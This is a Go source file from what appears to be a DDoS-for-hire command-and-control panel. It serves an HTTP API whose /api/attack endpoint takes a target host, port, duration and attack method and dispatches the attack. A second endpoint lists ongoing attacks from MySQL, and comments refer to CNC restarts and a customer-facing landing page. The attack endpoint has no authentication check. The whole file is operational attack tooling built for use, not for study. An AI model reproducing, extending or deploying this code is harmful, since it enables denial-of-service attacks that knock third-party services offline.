package core

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// StartAPIServer runs the HTTP attack API in a background goroutine. No-op if disabled.
func StartAPIServer(srv *Server, db *Database, atk *AttackManager, wh *WebhookManager) {
	cfg := srv.GetConfig()
	if !cfg.API.Enabled || strings.TrimSpace(cfg.API.ListenAddr) == "" {
		return
	}
	addr := cfg.API.ListenAddr
	mux := http.NewServeMux()
	h := &apiHandler{server: srv, db: db, atk: atk, wh: wh}
	mux.HandleFunc("/api/attack", h.handleAttack)
	mux.HandleFunc("/api/ongoing", h.handleOngoing)

	httpSrv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
	}
	go func() {
		if err := httpSrv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[!] API server error: %v", err)
		}
	}()
}

// StartWebsiteServer serves the embedded landing page. No-op if disabled.
// index.html and style.css are compiled into the binary via go:embed.
// Only content.json is read from disk (assets/web/content.json) — the one customer-editable file.
func StartWebsiteServer(cfg *Config) {
	if !cfg.Website.Enabled {
		return
	}
	port := cfg.Website.Port
	if port <= 0 {
		port = 8081
	}

	// Resolve content.json path — the only file served from disk.
	contentPath, err := resolveContentJSON()
	if err != nil {
		log.Printf("[!] Website server: cannot resolve content.json: %v — website not started", err)
		return
	}

	mux := http.NewServeMux()

	// Embedded files — served from binary, never from disk.
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(embeddedIndexHTML)
	})
	mux.HandleFunc("/style.css", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/css; charset=utf-8")
		w.Write(embeddedStyleCSS)
	})

	// content.json — served from disk so customers can edit it without rebuilding.
	mux.HandleFunc("/content.json", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		http.ServeFile(w, r, contentPath)
	})

	// /dashboard — coming soon placeholder; no 404, easy to replace later.
	mux.HandleFunc("/dashboard", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, dashboardComingSoon)
	})

	host := cfg.ServerConfig.ResolveSSHBindHost()
	addr := fmt.Sprintf("%s:%d", host, port)
	httpSrv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
	}
	go func() {
		if err := httpSrv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[!] Website server error: %v", err)
		}
	}()
}

// resolveContentJSON returns the absolute path to assets/web/content.json.
// Checks cwd first (set by ChdirToProjectWithAssets), then falls back to exe directory.
func resolveContentJSON() (string, error) {
	const rel = "assets/web/content.json"

	if cwd, err := os.Getwd(); err == nil {
		candidate := filepath.Join(cwd, rel)
		if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
			return candidate, nil
		}
	}

	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("cannot determine executable path: %w", err)
	}
	exeDir, err := filepath.EvalSymlinks(filepath.Dir(exe))
	if err != nil {
		exeDir = filepath.Dir(exe)
	}
	candidate := filepath.Join(exeDir, rel)
	if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
		return candidate, nil
	}

	return "", fmt.Errorf("assets/web/content.json not found (checked cwd and exe directory)")
}

// dashboardComingSoon is the placeholder served at /dashboard until the real dashboard is built.
const dashboardComingSoon = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Dashboard — Coming Soon</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#000;color:#ededed;font-family:system-ui,-apple-system,sans-serif;
  display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:2rem}
.wrap{max-width:400px}
.label{font-size:.72rem;font-weight:500;letter-spacing:.1em;text-transform:uppercase;
  color:#666;border:1px solid #333;border-radius:999px;padding:.3rem .85rem;display:inline-block;margin-bottom:1.5rem}
h1{font-size:2rem;font-weight:700;letter-spacing:-.03em;color:#fff;margin-bottom:.75rem}
p{font-size:.88rem;color:#666}
a{display:inline-block;margin-top:2rem;font-size:.82rem;color:#ededed;
  border:1px solid #333;border-radius:6px;padding:.5rem 1.1rem;text-decoration:none}
a:hover{border-color:#fff;color:#fff}
</style>
</head>
<body>
<div class="wrap">
  <span class="label">Coming Soon</span>
  <h1>Dashboard</h1>
  <p>The web dashboard is not available yet.</p>
  <a href="/">← Back to home</a>
</div>
</body>
</html>`

type apiHandler struct {
	server *Server
	db     *Database
	atk    *AttackManager
	wh     *WebhookManager
}

// apiEnvelope is used for pretty error and meta responses.
type apiEnvelope struct {
	OK      bool   `json:"ok"`
	Status  string `json:"status"`
	Message string `json:"message,omitempty"`
	Detail  string `json:"detail,omitempty"`
	HTTP    int    `json:"http_status,omitempty"`
}

type apiAttackDispatchOK struct {
	OK      bool   `json:"ok"`
	Status  string `json:"status"`
	Message string `json:"message"`
	Attack  struct {
		LogID            int64  `json:"log_id"`
		Host             string `json:"host"`
		Port             int    `json:"port"`
		Method           string `json:"method"`
		DurationSeconds  int    `json:"duration_seconds"`
		AttributedUser   string `json:"attributed_user"`
	} `json:"attack"`
	Timing struct {
		LoggedAtUnix     int64 `json:"logged_at_unix"`
		EndsAtUnix       int64 `json:"ends_at_unix"`
		RemainingSeconds int64 `json:"remaining_seconds"`
	} `json:"timing"`
	Panel struct {
		OngoingAttacksTotal int    `json:"ongoing_attacks_total"`
		Note                string `json:"note"`
	} `json:"panel"`
}

type apiOngoingResponse struct {
	OK      bool              `json:"ok"`
	Status  string            `json:"status"`
	Count   int               `json:"count"`
	Attacks []apiOngoingEntry `json:"attacks"`
	Meta    struct {
		Source string `json:"source"`
		Filter string `json:"filter"`
		Note   string `json:"note"`
	} `json:"meta"`
}

type apiOngoingEntry struct {
	ID               int    `json:"id"`
	Username         string `json:"username"`
	Host             string `json:"host"`
	Port             int    `json:"port"`
	Method           string `json:"method"`
	DurationSeconds  int    `json:"duration_seconds"`
	TimeSentUnix     int64  `json:"time_sent_unix"`
	EndsAtUnix       int64  `json:"ends_at_unix"`
	RemainingSeconds int64  `json:"remaining_seconds"`
}

func (h *apiHandler) encodeJSON(w http.ResponseWriter, r *http.Request, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	if r != nil && r.URL.Query().Get("compact") == "1" {
		w.WriteHeader(status)
		_ = json.NewEncoder(w).Encode(v)
		return
	}
	b, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = w.Write([]byte("{\n  \"ok\": false,\n  \"status\": \"error\",\n  \"message\": \"response encoding failed\"\n}\n"))
		return
	}
	w.WriteHeader(status)
	_, _ = w.Write(b)
	_, _ = w.Write([]byte("\n"))
}

func (h *apiHandler) handleAttack(w http.ResponseWriter, r *http.Request) {
	cfg := h.server.GetConfig()
	if !cfg.API.Enabled || strings.TrimSpace(cfg.API.ListenAddr) == "" {
		http.Error(w, "API disabled", http.StatusServiceUnavailable)
		return
	}
	if r.Method != http.MethodGet && r.Method != http.MethodPost {
		w.Header().Set("Allow", "GET, POST")
		h.encodeJSON(w, r, http.StatusMethodNotAllowed, apiEnvelope{
			OK:      false,
			Status:  "method_not_allowed",
			Message: "Use GET or POST",
			HTTP:    http.StatusMethodNotAllowed,
		})
		return
	}

	q := r.URL.Query()
	host := strings.TrimSpace(q.Get("host"))
	method := strings.ToUpper(strings.TrimSpace(q.Get("method")))
	portStr := strings.TrimSpace(q.Get("port"))
	timeStr := strings.TrimSpace(q.Get("time"))

	if host == "" || method == "" || portStr == "" || timeStr == "" {
		h.encodeJSON(w, r, http.StatusBadRequest, apiEnvelope{
			OK:      false,
			Status:  "bad_request",
			Message: "Missing one or more required query parameters",
			Detail:  "Required: host, port, time, method",
			HTTP:    http.StatusBadRequest,
		})
		return
	}

	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		h.encodeJSON(w, r, http.StatusBadRequest, apiEnvelope{
			OK:      false,
			Status:  "bad_request",
			Message: "Invalid port",
			Detail:  "Port must be an integer 1–65535",
			HTTP:    http.StatusBadRequest,
		})
		return
	}
	duration, err := strconv.Atoi(timeStr)
	if err != nil || duration < 1 {
		h.encodeJSON(w, r, http.StatusBadRequest, apiEnvelope{
			OK:      false,
			Status:  "bad_request",
			Message: "Invalid time",
			Detail:  "time must be a positive integer (seconds)",
			HTTP:    http.StatusBadRequest,
		})
		return
	}

	u, err := h.db.GetFirstUser()
	if err != nil {
		h.encodeJSON(w, r, http.StatusServiceUnavailable, apiEnvelope{
			OK:      false,
			Status:  "service_unavailable",
			Message: "No users configured in database",
			HTTP:    http.StatusServiceUnavailable,
		})
		return
	}

	logID, timeSent, err := h.atk.SendAttackForUser(u, h.wh, method, host, port, duration)
	if err != nil {
		theme := strings.TrimSpace(u.Theme)
		if theme == "" {
			theme = "default"
		}
		h.encodeJSON(w, r, http.StatusBadRequest, apiEnvelope{
			OK:      false,
			Status:  "rejected",
			Message: FormatAttackUserErrorTheme(theme, err),
			HTTP:    http.StatusBadRequest,
		})
		return
	}

	endsAt := timeSent + int64(duration)
	now := time.Now().Unix()
	rem := endsAt - now
	if rem < 0 {
		rem = 0
	}

	ongoing, _ := h.db.GetOngoingCount()

	var out apiAttackDispatchOK
	out.OK = true
	out.Status = "dispatched"
	out.Message = "Attack recorded in database and dispatch started."
	out.Attack.LogID = logID
	out.Attack.Host = host
	out.Attack.Port = port
	out.Attack.Method = method
	out.Attack.DurationSeconds = duration
	out.Attack.AttributedUser = u.Username
	out.Timing.LoggedAtUnix = timeSent
	out.Timing.EndsAtUnix = endsAt
	out.Timing.RemainingSeconds = rem
	out.Panel.OngoingAttacksTotal = ongoing
	out.Panel.Note = "Rows are inserted into MySQL before outbound URLs run. Ongoing counts use time_sent + duration vs server time, so attacks remain visible across CNC restarts until they expire."

	h.encodeJSON(w, r, http.StatusOK, out)
}

func (h *apiHandler) handleOngoing(w http.ResponseWriter, r *http.Request) {
	cfg := h.server.GetConfig()
	if !cfg.API.Enabled || strings.TrimSpace(cfg.API.ListenAddr) == "" {
		http.Error(w, "API disabled", http.StatusServiceUnavailable)
		return
	}
	if r.Method != http.MethodGet {
		w.Header().Set("Allow", "GET")
		h.encodeJSON(w, r, http.StatusMethodNotAllowed, apiEnvelope{
			OK:      false,
			Status:  "method_not_allowed",
			Message: "Use GET",
			HTTP:    http.StatusMethodNotAllowed,
		})
		return
	}

	list, err := h.db.GetOngoingAttacks()
	if err != nil {
		h.encodeJSON(w, r, http.StatusInternalServerError, apiEnvelope{
			OK:      false,
			Status:  "error",
			Message: "Failed to read ongoing attacks",
			Detail:  err.Error(),
			HTTP:    http.StatusInternalServerError,
		})
		return
	}

	now := time.Now().Unix()
	var out apiOngoingResponse
	out.OK = true
	out.Status = "ok"
	out.Count = len(list)
	out.Meta.Source = "mysql"
	out.Meta.Filter = "time_sent + duration > UNIX_TIMESTAMP()"
	out.Meta.Note = "Each row is active until ends_at_unix; survives CNC restart."

	for _, a := range list {
		ends := a.TimeSent + int64(a.Duration)
		rem := ends - now
		if rem < 0 {
			rem = 0
		}
		out.Attacks = append(out.Attacks, apiOngoingEntry{
			ID:               a.ID,
			Username:         a.Username,
			Host:             a.Host,
			Port:             a.Port,
			Method:           a.Method,
			DurationSeconds:  a.Duration,
			TimeSentUnix:     a.TimeSent,
			EndsAtUnix:       ends,
			RemainingSeconds: rem,
		})
	}

	h.encodeJSON(w, r, http.StatusOK, out)
}
